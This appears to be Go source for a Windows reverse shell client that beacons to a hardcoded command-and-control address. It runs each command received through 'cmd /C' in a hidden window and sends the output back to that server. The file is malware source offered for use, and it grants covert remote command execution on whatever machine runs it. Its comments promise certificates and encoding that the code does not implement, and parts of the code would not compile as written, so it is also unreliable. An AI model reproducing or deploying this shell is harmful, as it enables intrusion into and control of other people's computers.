// This is a basic reverse shell client
// The intention is to use this with the corresponding c2 server

// Data protection will be performed through server/client certificates
// Data will be encoded prior to sending back to the server and decoded on the back end


package main

import (

    "net"
    "time"
    "bufio"
    "os/exec"
    "syscall"
)

// Client to server heartbeat to determine if c2 server is running
func shell(addr string) {
	check_conn:
	for {
		c, e := net.Dial("tcp", addr)
		if e != nil {
		    time.Sleep(3 * time.Second)
		} else {
			c.Close()
			break
		}
	}

    // Establish connection between client and server
    conn,_:= net.Dial("tcp", addr)
        for {
            status, disconnect := bufio.NewReader(conn).ReadString('\n');
            if disconnect != nil {
                goto check_conn
                break
            }
            p := []byte("shell>")
            cmd := exec.Command("cmd", "/C", status)
            cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
            stdout, _ := cmd.Output();
            buf = append(p, stdout)
            conn.Write(buf)
        }
}

// Main establishes the call back to the c2 server IP address and port specified
func main() {
	var c2_ip string
	c2_ip = "192.168.1.6:4433"
	shell(c2_ip)
}